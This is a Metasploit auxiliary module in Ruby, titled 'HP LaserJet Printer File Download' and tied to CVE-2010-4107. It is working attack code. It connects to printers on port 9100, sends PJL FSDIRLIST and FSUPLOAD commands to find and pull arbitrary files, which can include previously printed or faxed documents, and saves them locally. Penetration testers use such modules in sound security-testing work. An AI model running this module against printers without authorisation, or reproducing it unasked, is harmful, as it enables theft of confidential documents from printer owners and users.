##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'HP LaserJet Printer File Download',
			'Description'    => %q{
					This module allows to download from the file system of HP LaserJet printers.
				In some cases it's possible to download the files previously printed or faxed.
				Note: you can use hp_laserjet_enum_fs module to enumerate file system.
			},
			'References'     =>
				[
					['CVE', '2010-4107'],
					['EDB', '15631'],
					['URL', 'http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pdf'],
					['URL', 'http://packetstormsecurity.org/files/103778/hpjetdirect-exec.rb.txt']
				],
			'Author'         => 'Matteo Cantoni <goony[at]nothink.org>',
			'License'        => MSF_LICENSE
		))

		register_options(
			[
				Opt::RPORT(9100),
				OptInt.new('ENTRY', [true, 'Used to limit the amount of data returned to the host', 1]),
				OptInt.new('COUNT', [true, 'Used to limit the amount of data returned to the host', 999999]),
				OptString.new('RFILE', [true, 'The file name (full path between single quotes) to download', ''])
			], self.class)

		deregister_options('VHOST')
	end

	# PJL commands are recognized by the following HP printers:
	#
	# . LaserJet IIISi, 4Si, 4SiMx, 5Si, 5SiMx, 5Si Mopier
	# . LaserJet 1100 Series, 2100 Series
	# . LaserJet 4000 Series, 5000 Series
	# . LaserJet 8000 Series, 8100 Series
	# . LaserJet 4V, 4MV
	# . LaserJet 4, 4 Plus, 4M, 4M Plus, 5, 5M
	# . LaserJet 4L, 4ML, 4LJ Pro, 4LC, 5L, 6L
	# . LaserJet 4P, 4MP, 4PJ, 5P, 6P, 6MP
	# . Color LaserJet, Color LaserJet 5, 5M
	# . Color LaserJet 4500 Series, 8500 Series
	# . DeskJet 1200C, 1600C
	# . DesignJet Family
	# . PaintJet XL300

	def errors_handling(err_code)

		err_code = err_code.to_i + 32000

		# PJL File System Errors (32xxx)
		fs_errors = {
			'32000' => 'General error',
			'32001' => 'Volume not available',
			'32002' => 'Disk full',
			'32003' => 'File not found',
			'32004' => 'No free file descriptors',
			'32005' => 'Invalid number of bytes',
			'32006' => 'File already exists',
			'32007' => 'Illegal name',
			'32008' => 'Can\'t delete root',
			'32009' => 'File operation attempted on a directory',
			'32010' => 'Directory operation attempted on a file',
			'32011' => 'Not same volume',
			'32012' => 'Read only',
			'32013' => 'Directory full',
			'32014' => 'Directory not empty',
			'32015' => 'Bad disk',
			'32016' => 'No label',
			'32017' => 'Invalid parameter',
			'32018' => 'No contiguous space',
			'32019' => 'Can\'t change root',
			'32020' => 'File Descriptor obsolete',
			'32021' => 'Deleted',
			'32022' => 'No block device',
			'32023' => 'Bad seek',
			'32024' => 'Internal error',
			'32025' => 'Write only',
			'32026' => 'Write protected',
			'32027' => 'No filename',
			'32051' => 'End of directory',
			'32052' => 'No file system',
			'32053' => 'No memory',
			'32054' => 'Vol name out of range',
			'32055' => 'Bad FS',
			'32056' => 'Hardware failure'
		}

		if (fs_errors.has_key?(err_code.to_s))
			return fs_errors[err_code.to_s]
		else
			return 'Bad command or error'
		end
	end

	def send_request(ip,port,conn,rfile,psave)

		entry = datastore['ENTRY']
		count = datastore['COUNT']

		# Sanitize path and get dir full path
		rfile.gsub!(/\\\\/,"\\")
		rtmp = rfile.split("\\")
		nfile = rtmp.pop
		rdir = rtmp.join("\\")

		# Format of PJL Commands - #4
		#
		# @PJL command [command modifier : value] [option name [= value]] [<CR>]<LF>
		# This format is used for all of the other PJL commands.
		# The PJL prefix .@PJL. always must be uppercase.
		prefix = "@PJL "
		postfix = "\r\n"

		# Get the file size
		command = 'FSDIRLIST NAME="' + rdir + '"' + " ENTRY=#{entry} COUNT=#{count}"

		req = prefix + command + postfix

		vprint_status("Sending request to #{ip}: #{req.chop}")

		# The first request to get the size of file (needful!)
		conn.put(req)
		res = conn.get(-1,1)

		if not res
			raise RuntimeError, "Error in receiving data from #{ip}:#{port}"
		elsif res and res.to_s =~ /ERROR/
			if res.to_s =~ /FILEERROR=(\d+)/
				file_error = errors_handling($1)
				print_error("'#{file_error}' message from #{ip}:#{port}!")
				return
			end
		end

		resx = res.to_s[res.index(postfix)+1,res.length]

		check_rfile = 0

		if (req =~ /^@PJL FSDIRLIST NAME="(.*)" ENTRY=/)
			resx.split("\n").each do |line|
				if line !~ /^\. |^\.\. / and line =~ /#{nfile} TYPE=FILE SIZE=(\d+)/
					file_size = $1

					# HP PCL/PJL Reference: 'Uploads' all or
					# part of a file from the printer to the host.
					command = 'FSUPLOAD NAME="' + rfile + '"' + " OFFSET=0 SIZE=#{file_size}"

					req = prefix + command + postfix

					print_status("Sending request for #{rfile} file to #{ip}")

					conn.put(req)
					res = conn.get(-1,1)
					return if not res

					if res.to_s =~ /FILEERROR=(\d+)/
						file_error = errors_handling($1)
						print_error("'#{file_error}' message from #{ip}:#{port}!")
						return
					end

					resx = res.to_s[res.index(postfix)+1,res.length]

					# Sanitize headers! :)
					resx = resx[1..-1]

					# Store the results on local file system
					fname = ::File.basename(rfile)
					p = store_loot('hp.laserjet.file', 'application/octet-stream', ip, resx, fname)
					print_status("Data saved to #{p}")

					# Ok, rfile taken!
					check_rfile = 1
				end
			end

			if check_rfile == 0
				print_error("'#{rfile}' file doesn't exist on #{ip}:#{port}!")
			end
		end
	end

	def connect_to(ip)
		port = datastore['RPORT']
		rfile = datastore['RFILE']
		psave = datastore['PATH_SAVE']

		print_status("Connecting to #{ip}:#{port}...")
		conn = connect
		begin
			send_request(ip,port,conn,rfile,psave)
		ensure
			disconnect
		end
	end

	def run_host(ip)
		connect_to(ip)
	end
end
